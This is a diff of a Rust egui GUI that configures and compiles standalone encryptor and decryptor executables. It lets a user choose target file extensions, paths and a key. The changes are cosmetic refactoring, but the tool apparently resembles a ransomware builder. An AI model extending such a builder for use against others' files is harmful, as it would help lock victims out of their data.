@@ -27,11 +27,7 @@ impl BuilderApp {
 		let mut exts = Vec::new();
 		for (category, ext_list) in EXTENSIONS {
 			for ext in *ext_list {
-				exts.push(FileExtension {
-					name: ext.to_string(),
-					enabled: true,
-					category: category.to_string(),
-				});
+				exts.push(FileExtension { name: ext.to_string(), enabled: true, category: category.to_string(), });
 			}
 		}
 		exts
@@ -39,20 +35,14 @@ impl BuilderApp {
 
 	fn add_log(&mut self, message: String, is_error: bool) {
 		let timestamp = Local::now().format("%H:%M:%S").to_string();
-		self.logs.push(LogEntry {
-			timestamp,
-			message,
-			is_error,
-		});
-		if self.logs.len() > 100 {
-			self.logs.remove(0);
-		}
+		self.logs.push(LogEntry { timestamp, message, is_error, });
+		if self.logs.len() > 100 { self.logs.remove(0); }
 	}
 
 	fn add_path(&mut self, path: String, is_file: bool) {
 		if !path.is_empty() && !self.paths.iter().any(|p| p.path == path) {
 			self.paths.push(PathEntry { path: path.clone(), is_file });
-			self.add_log(format!("✅ Added path: {}", path), false);
+			self.add_log(format!("Added path: {}", path), false);
 		}
 	}
 
@@ -63,15 +53,8 @@ impl BuilderApp {
 		}
 	}
 
-	fn toggle_extension(&mut self, index: usize) {
-		if index < self.extensions.len() {
-			self.extensions[index].enabled = !self.extensions[index].enabled;
-		}
-	}
-
 	fn get_enabled_extensions(&self) -> String {
 		if self.use_custom_extensions { return self.custom_extensions_input.clone(); }
-
 		let enabled: Vec<String> = self.extensions.iter().filter(|e| e.enabled).map(|e| e.name.clone()).collect();
 		enabled.join(",")
 	}
@@ -111,12 +94,10 @@ impl BuilderApp {
 	}
 
 	pub fn compile_cryptor(&mut self, mode: String, output_name: String) {
-		// Подготавливаем пути для компиляции
 		let paths_str = self.paths.iter().map(|p| p.path.clone()).collect::<Vec<_>>().join("|");
 
 		let extensions_str = if !self.extensions.is_empty() { self.get_enabled_extensions() } else { "".to_string() };
 
-		// Проверяем наличие cargo
 		let cargo_check = Command::new("cargo").arg("--version").output();
 		if cargo_check.is_err() {
 			self.add_log("❌ Cargo not found! Make sure Rust is installed".to_string(), true);
@@ -187,13 +168,11 @@ impl eframe::App for BuilderApp {
 			ui.label("Create standalone encryptors/decryptors with custom configs");
 			ui.separator();
 
-			// Две колонки
 			egui::SidePanel::left("settings")
 				.default_width(400.0)
 				.min_width(350.0)
 				.resizable(true)
 				.show(ctx, |ui| {
-					// Добавляем скролл для всей левой панели
 					egui::ScrollArea::vertical()
 						.id_source("left_panel_scroll")
 						.auto_shrink([false; 2])
@@ -202,24 +181,18 @@ impl eframe::App for BuilderApp {
 
 							ui.horizontal(|ui| {
 								ui.checkbox(&mut self.use_custom_extensions, "Use custom extensions");
-								if ui.button("📋 Select All").clicked() {
-									self.select_all(true);
-								}
-								if ui.button("🗑️ Clear All").clicked() {
-									self.select_all(false);
-								}
+								if ui.button("📋 Select All").clicked() { self.select_all(true); }
+								if ui.button("🗑️ Clear All").clicked() { self.select_all(false); }
 							});
 
 							if self.use_custom_extensions {
 								ui.label("Custom extensions (comma-separated):");
 								ui.text_edit_multiline(&mut self.custom_extensions_input);
-								ui.colored_label(egui::Color32::LIGHT_BLUE,
-								                 "Example: txt,doc,pdf,jpg,png,rs,py,js");
+								ui.colored_label(egui::Color32::LIGHT_BLUE, "Example: txt,doc,pdf,jpg,png,rs,py,js");
 							} else {
 								ui.label("Select file types to encrypt:");
 								ui.add_space(5.0);
 
-								// Добавляем скролл для списка расширений
 								egui::ScrollArea::vertical()
 									.id_source("extensions_scroll")
 									.max_height(300.0)
@@ -241,27 +214,17 @@ impl eframe::App for BuilderApp {
 												.map(|(i, _)| i)
 												.collect();
 
-											let enabled_count = category_exts.iter()
-												.filter(|&&i| self.extensions[i].enabled)
-												.count();
+											let enabled_count = category_exts.iter().filter(|&&i| self.extensions[i].enabled).count();
 											let total_count = category_exts.len();
 
 											let all_enabled = enabled_count == total_count;
 
 											ui.horizontal(|ui| {
-												// Чекбокс для всей категории
 												let mut category_enabled = all_enabled;
 												let response = ui.checkbox(&mut category_enabled, "");
-												if response.changed() {
-													for &idx in &category_exts {
-														self.extensions[idx].enabled = category_enabled;
-													}
-												}
+												if response.changed() { for &idx in &category_exts { self.extensions[idx].enabled = category_enabled; } }
 
-												// Collapsing заголовок с названием категории
-												let collapsing = egui::CollapsingHeader::new(format!("📁 {} ({}/{})", category, enabled_count, total_count))
-													.id_source(format!("cat_{}", category))
-													.default_open(is_open);
+												let collapsing = egui::CollapsingHeader::new(format!("📁 {} ({}/{})", category, enabled_count, total_count)).id_source(format!("cat_{}", category)).default_open(is_open);
 
 												let header_response = collapsing.show(ui, |ui| {
 													for &idx in &category_exts {
@@ -269,20 +232,13 @@ impl eframe::App for BuilderApp {
 															ui.add_space(20.0);
 															let mut enabled = self.extensions[idx].enabled;
 															let response = ui.checkbox(&mut enabled, &self.extensions[idx].name);
-															if response.changed() {
-																self.extensions[idx].enabled = enabled;
-															}
+															if response.changed() { self.extensions[idx].enabled = enabled; }
 														});
 													}
 												});
 
-												// Обновляем состояние открытия категории
 												if header_response.header_response.clicked() {
-													if is_open {
-														self.open_categories.retain(|c| c != &category);
-													} else {
-														self.open_categories.push(category);
-													}
+													if is_open { self.open_categories.retain(|c| c != &category); } else { self.open_categories.push(category); }
 												}
 											});
 										}
@@ -298,14 +254,11 @@ impl eframe::App for BuilderApp {
 							ui.add_space(10.0);
 							ui.separator();
 
-							// Ключ
 							ui.label("🔑 Encryption Key (64 hex characters):");
 							ui.horizontal(|ui| {
 								ui.text_edit_singleline(&mut self.key_hex);
 								if ui.button("🎲 Random").clicked() {
-									self.key_hex = (0..32)
-										.map(|_| format!("{:02x}", rand::random::<u8>()))
-										.collect();
+									self.key_hex = (0..32).map(|_| format!("{:02x}", rand::random::<u8>())).collect();
 									self.add_log("🎲 Generated new random key".to_string(), false);
 								}
 							});
@@ -319,10 +272,8 @@ impl eframe::App for BuilderApp {
 							ui.add_space(10.0);
 							ui.separator();
 
-							// Список путей
 							ui.label("📁 Paths to process:");
 
-							// Добавление нового пути
 							ui.horizontal(|ui| {
 								ui.text_edit_singleline(&mut self.new_path);
 								if ui.button("📂 Add folder").clicked() {
@@ -341,7 +292,6 @@ impl eframe::App for BuilderApp {
 
 							ui.add_space(5.0);
 
-							// Отображение списка путей
 							if !self.paths.is_empty() {
 								egui::Frame::group(ui.style()).show(ui, |ui| {
 									egui::ScrollArea::vertical()
@@ -369,38 +319,28 @@ impl eframe::App for BuilderApp {
 							ui.add_space(10.0);
 							ui.separator();
 
-							// Создание encryptor и decryptor
 							ui.label("🔧 Generate executables:");
 
 							ui.horizontal(|ui| {
 								ui.label("Encryptor name:");
 								ui.text_edit_singleline(&mut self.encrypt_exe_name);
-								if !self.encrypt_exe_name.ends_with(".exe") && !self.encrypt_exe_name.is_empty() {
-									self.encrypt_exe_name.push_str(".exe");
-								}
+								if !self.encrypt_exe_name.ends_with(".exe") && !self.encrypt_exe_name.is_empty() { self.encrypt_exe_name.push_str(".exe"); }
 							});
 
-							if ui.button("🔒 Create Encryptor").clicked() {
-								self.create_encryptor();
-							}
+							if ui.button("🔒 Create Encryptor").clicked() { self.create_encryptor(); }
 
 							ui.add_space(5.0);
 
 							ui.horizontal(|ui| {
 								ui.label("Decryptor name:");
 								ui.text_edit_singleline(&mut self.decrypt_exe_name);
-								if !self.decrypt_exe_name.ends_with(".exe") && !self.decrypt_exe_name.is_empty() {
-									self.decrypt_exe_name.push_str(".exe");
-								}
+								if !self.decrypt_exe_name.ends_with(".exe") && !self.decrypt_exe_name.is_empty() { self.decrypt_exe_name.push_str(".exe"); }
 							});
 
-							if ui.button("🔓 Create Decryptor").clicked() {
-								self.create_decryptor();
-							}
+							if ui.button("🔓 Create Decryptor").clicked() { self.create_decryptor(); }
 
 							ui.add_space(10.0);
 
-							// Статус
 							ui.separator();
 							ui.label("📊 Status:");
 							let status_text = &self.status;
@@ -414,7 +354,6 @@ impl eframe::App for BuilderApp {
 						});
 				});
 
-			// Правая панель с логами
 			egui::SidePanel::right("logs_panel")
 				.default_width(ui.available_width() - 400.0)
 				.min_width(250.0)
@@ -431,17 +370,13 @@ impl eframe::App for BuilderApp {
 							let logs_clone: Vec<LogEntry> = self.logs.clone();
 							for log in logs_clone.iter().rev() {
 								if log.is_error {
-									ui.colored_label(egui::Color32::LIGHT_RED,
-									                 format!("[{}] {}", log.timestamp, log.message));
+									ui.colored_label(egui::Color32::LIGHT_RED, format!("[{}] {}", log.timestamp, log.message));
 								} else {
-									ui.colored_label(egui::Color32::LIGHT_GREEN,
-									                 format!("[{}] {}", log.timestamp, log.message));
+									ui.colored_label(egui::Color32::LIGHT_GREEN, format!("[{}] {}", log.timestamp, log.message));
 								}
 							}
 
-							if self.logs.is_empty() {
-								ui.colored_label(egui::Color32::GRAY, "No activity yet");
-							}
+							if self.logs.is_empty() { ui.colored_label(egui::Color32::GRAY, "No activity yet"); }
 						});
 
 					ui.add_space(5.0);
